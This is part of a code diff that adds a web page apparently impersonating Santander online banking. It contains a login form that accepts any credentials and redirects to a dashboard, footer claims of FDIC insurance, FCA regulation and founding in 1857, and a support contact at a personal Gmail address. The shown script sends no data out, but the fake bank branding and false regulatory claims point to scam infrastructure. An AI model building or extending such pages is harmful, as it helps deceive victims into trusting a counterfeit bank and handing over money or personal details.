+              <i class="fas fa-eye eye" id="eyeIcon" onclick="togglePassword()"></i>
+            </div>
+          </div>
+          <button type="submit" id="submitBtn">
+            Log in <i class="fas fa-arrow-right"></i>
+          </button>
+          <div class="login-message" id="loginMessage"></div>
+        </form>
+
+        
+      </div>
+    </div>
+  </section>
+
+  <!-- Animated Security Marquee -->
+  <section class="security" id="help">
+    <div class="marquee-track">
+      <div class="security-item"><i class="fas fa-shield-alt"></i><span>FDIC insured up to $250,000</span></div>
+      <div class="security-item"><i class="fas fa-lock"></i><span>256-bit encryption</span></div>
+      <div class="security-item"><i class="fas fa-headset"></i><span>24/7 customer support</span></div>
+      <div class="security-item"><i class="fas fa-mobile-alt"></i><span>Freeze card in app</span></div>
+      
+      <div class="security-item"><i class="fas fa-shield-alt"></i><span>FDIC insured up to $250,000</span></div>
+      <div class="security-item"><i class="fas fa-lock"></i><span>256-bit encryption</span></div>
+      <div class="security-item"><i class="fas fa-headset"></i><span>24/7 customer support</span></div>
+      <div class="security-item"><i class="fas fa-mobile-alt"></i><span>Freeze card in app</span></div>
+    </div>
+  </section>
+
+  <!-- SIMPLE CREDIBILITY FOOTER -->
+  <footer class="footer">
+    <div class="container">
+      
+      <div class="footer-credentials">
+        <div class="credential-item">
+          <i class="fas fa-shield-alt"></i>
+          <div>
+            <span class="c-title">FDIC Insured</span>
+            <span class="c-sub">Up to $250,000</span>
+          </div>
+        </div>
+        <div class="credential-item">
+          <i class="fas fa-home"></i>
+          <div>
+            <span class="c-title">Equal Housing</span>
+            <span class="c-sub">Lender</span>
+          </div>
+        </div>
+        <div class="credential-item">
+          <i class="fas fa-landmark"></i>
+          <div>
+            <span class="c-title">Established 1857</span>
+            <span class="c-sub">Over 165 Years</span>
+          </div>
+        </div>
+        <div class="credential-item">
+          <i class="fas fa-certificate"></i>
+          <div>
+            <span class="c-title">FCA Regulated</span>
+            <span class="c-sub">Fully Authorised</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer-middle">
+        <div class="footer-logo">
+          <div class="logo-mark">S</div>
+          <div>
+            <div class="brand-name">Santander</div>
+            <span class="brand-tag">TRUSTED ONLINE BANKING</span>
+          </div>
+        </div>
+        <p>A global financial institution committed to helping you prosper with fair, transparent, and innovative banking services.</p>
+        <div class="footer-email">
+          <i class="fas fa-envelope"></i>
+          <a href="mailto:trutmgtsupport59@gmail.com">trutmgtsupport59@gmail.com</a>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <strong>Santander Online Bank</strong> is a registered financial institution. Banking products are provided by Santander Bank, N.A., Member FDIC. Investment products are not FDIC insured, are not bank guaranteed, and may lose value. Equal Housing Lender. All loans are subject to credit approval.<br>
+        © 2025 Santander Online Bank. All rights reserved.
+      </div>
+      
+    </div>
+  </footer>
+
+  <script>
+    // Toggle password visibility
+    function togglePassword() {
+      const pw = document.getElementById('password');
+      const icon = document.getElementById('eyeIcon');
+      if (pw.type === 'password') {
+        pw.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+      } else {
+        pw.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+      }
+    }
+
+    // Hamburger menu toggle
+    const menuBtn = document.getElementById('menuBtn');
+    const navDropdown = document.getElementById('navDropdown');
+    menuBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      navDropdown.classList.toggle('open');
+    });
+    document.addEventListener('click', (e) => {
+      if (!navDropdown.contains(e.target) && !menuBtn.contains(e.target)) {
+        navDropdown.classList.remove('open');
+      }
+    });
+    navDropdown.querySelectorAll('a').forEach(a => {
+      a.addEventListener('click', () => navDropdown.classList.remove('open'));
+    });
+
+    // Login form + redirect
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const message = document.getElementById('loginMessage');
+      const btn = document.getElementById('submitBtn');
+
+      if (username !== '' && password !== '') {
+        message.textContent = '✓ Logged in successfully! Redirecting to your dashboard...';
+        message.className = 'login-message success';
+        
+        btn.disabled = true;
+        btn.innerHTML = 'Redirecting... <i class="fas fa-spinner fa-spin"></i>';
+        
+        setTimeout(() => {
+          window.location.href = 'Dashboard.html';
+        }, 900);
+      } else {
+        message.textContent = 'Please enter your username and password to continue.';
+        message.className = 'login-message error';
+      }
+    });
+  </script>
+</body>
+</html>
